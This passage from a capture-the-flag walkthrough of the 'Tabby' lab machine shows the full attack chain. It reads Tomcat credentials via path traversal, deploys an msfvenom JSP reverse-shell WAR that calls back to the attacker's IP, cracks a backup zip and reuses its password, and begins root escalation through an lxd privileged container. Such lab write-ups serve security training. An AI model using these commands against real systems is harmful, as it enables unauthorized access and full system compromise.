plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">user</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">username</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">tomcat</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">password</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">$3cureP4s5w0rd123!</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">roles</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">admin-gui,manager-script</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">tomcat-users</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can connect with <code>tomcat</code> / <code>$3cureP4s5w0rd123!</code> to <a href="http://megahosting.htb:8080/manager/html" target="_blank" rel="noopener noreferrer">http://megahosting.htb:8080/manager/html</a></p><p>The manager interface seems to be enabled only on localhost but we may
upload files without it.</p><p>We can download <code>server.xml</code>
<a href="http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/server.xml" target="_blank" rel="noopener noreferrer">http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/etc/server.xml</a></p><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">Host</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">name</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">localhost</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)">  </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">appBase</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">webapps</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token tag" style="color:rgb(255, 121, 198)">            </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">unpackWARs</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">true</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">autoDeploy</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">true</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So it&#x27;s accessible only from localhost but will unpack WARs and auto deploy
them.</p><p>By reading <code>web.xml</code> we can see that <code>.jsp</code> are allowed.</p><p>Now it&#x27;s time to read documentation!</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="http-exploitation-file-upload--rce">HTTP exploitation: File upload &amp; RCE<a href="#http-exploitation-file-upload--rce" class="hash-link" aria-label="Direct link to HTTP exploitation: File upload &amp; RCE" title="Direct link to HTTP exploitation: File upload &amp; RCE">​</a></h2><p>Let&#x27;s see the <a href="https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands" target="_blank" rel="noopener noreferrer">Supported Manager Commands</a>.</p><blockquote><p>All commands that the Manager application knows how to process are specified in a single request URI like this:</p><p><code>http://{host}:{port}/manager/text/{command}?{parameters}</code></p><p>where {host} and {port} represent the hostname and port number on which Tomcat is running, {command} represents the Manager command you wish to execute, and {parameters} represents the query parameters that are specific to that command. In the illustrations below, customize the host and port appropriately for your installation.</p><p>The commands are usually executed by HTTP GET requests. The /deploy command has a form that is executed by an HTTP PUT request.</p></blockquote><p>Then we can read <strong>Deploy A New Application Archive (WAR) Remotely</strong>.</p><blockquote><p><code>http://localhost:8080/manager/text/deploy?path=/foo</code></p><p>Upload the web application archive (WAR) file that is specified as the request data in this HTTP PUT request, install it into the appBase directory of our corresponding virtual host, and start, deriving the name for the WAR file added to the appBase from the specified path. The application can later be undeployed (and the corresponding WAR file removed) by use of the /undeploy command.</p><p>This command is executed by an HTTP PUT request.</p></blockquote><p>Let&#x27;s craft a WAR reverse shell.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ msfvenom --list payloads | grep -i jsp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    java/jsp_shell_bind_tcp                             Listen for a connection and spawn a command shell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    java/jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.49 LPORT=9999 -f war &gt; revshell.war</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ curl -X PUT -u &#x27;tomcat&#x27;:&#x27;$3cureP4s5w0rd123!&#x27; -T revshell.war &#x27;http://tabby.htb:8080/manager/text/deploy?path=/cyfun&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">OK - Deployed application at context path [/cyfun]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now the <a href="http://megahosting.htb:8080/cyfun/" target="_blank" rel="noopener noreferrer">http://megahosting.htb:8080/cyfun/</a>.</p><p>Let&#x27;s start a listener with <a href="https://pwncat.org/" target="_blank" rel="noopener noreferrer">pwncat</a>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ pwncat -l 9999 -vv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO: Listening on :::9999 (family 10/IPv6, TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO: Client connected from 10.10.10.194:39776 (family 2/IPv4, TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">id</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tomcat@tabby:/var/lib/tomcat9$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="system-enumeration">System enumeration<a href="#system-enumeration" class="hash-link" aria-label="Direct link to System enumeration" title="Direct link to System enumeration">​</a></h2><p>With <a href="https://github.com/carlospolop/PEASS-ng" target="_blank" rel="noopener noreferrer">linpeas</a> we can find a backup file:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Backup files?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r-- 1 ash ash 8716 Jun 16 13:42 /var/www/html/files/16162020_backup.zip</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">tomcat@tabby:/var/www/html$ ls</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ls</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">assets  favicon.ico  files  index.php  logo.png  news.php  Readme.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tomcat@tabby:/var/www/html$ ls -lhA files</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ls -lhA files</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">total 28K</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r-- 1 ash  ash  8.6K Jun 16 13:42 16162020_backup.zip</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x 2 root root 4.0K Jun 16 20:13 archive</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x 2 root root 4.0K Jun 16 20:13 revoked_certs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r-- 1 root root 6.4K Jun 16 11:25 statement</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It password protected, lets&#x27; crack it with <code>fcrackzip</code>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ fcrackzip -D -p /usr/share/wordlists/password/rockyou.txt files/16162020_backup.zip</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">possible pw found: admin@it ()</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ unzip 16162020_backup.zip</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Archive:  16162020_backup.zip</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   creating: var/www/html/assets/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[16162020_backup.zip] var/www/html/favicon.ico password:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  inflating: var/www/html/favicon.ico</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   creating: var/www/html/files/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  inflating: var/www/html/index.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> extracting: var/www/html/logo.png</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  inflating: var/www/html/news.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  inflating: var/www/html/Readme.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--tomcat-to-ash">Privilege Escalation of Machine : tomcat to ash<a href="#privilege-escalation-of-machine--tomcat-to-ash" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : tomcat to ash" title="Direct link to Privilege Escalation of Machine : tomcat to ash">​</a></h2><p>Since the backup file was owned by ash we can try to re-use the archive password
for ash account:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">tomcat@tabby:/var/lib/tomcat9$ su ash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password: admin@it</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ash@tabby:/var/lib/tomcat9$</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ash@tabby:~$ cat user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">13a5665425216a6a5a14fbd8aab23b93</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--ash-to-root">Privilege Escalation of Machine : ash to root<a href="#privilege-escalation-of-machine--ash-to-root" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : ash to root" title="Direct link to Privilege Escalation of Machine : ash to root">​</a></h2><p>ash is in adm and lxd groups:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ash@tabby:~$ id</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation" target="_blank" rel="noopener noreferrer">lxc - Privilege escalation</a></p><p>Prepare distrobuilder:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo pacman -S go debootstrap rsync gnupg squashfs-tools git --needed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ go get -d -v github.com/lxc/distrobuilder/distrobuilder</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cd $HOME/go/src/github.com/lxc/distrobuilder</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ make</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Prepare and build an image:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ mkdir -p $HOME/ContainerImages/alpine/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cd $HOME/ContainerImages/alpine/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># or</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ mkdir -p $HOME/ContainerImages/voidlinux/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cd $HOME/ContainerImages/voidlinux/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/voidlinux.yaml</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sudo $HOME/go/bin/distrobuilder build-lxd voidlinux.yaml</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then, upload to the server the files <code>lxd.tar.xz</code> and <code>rootfs.squashfs</code>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ruby -run -e httpd . -p 8888</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[2020-08-09 15:40:46] INFO  WEBrick 1.6.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[2020-08-09 15:40:46] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[2020-08-09 15:40:46] INFO  WEBrick::HTTPServer#start: pid=43919 port=8888</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then on the target download &amp; add the image:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ wget http://10.10.14.76:8888/lxd.tar.xz</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ wget http://10.10.14.76:8888/rootfs.squashfs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ lxc image import lxd.tar.xz rootfs.squashfs --alias voidlinux</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ lxc image list</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Create a container and add root path:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ lxc init voidlinux cyfun -c security.privileged=true</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ lxc list</span><br></span><span class="token-line" 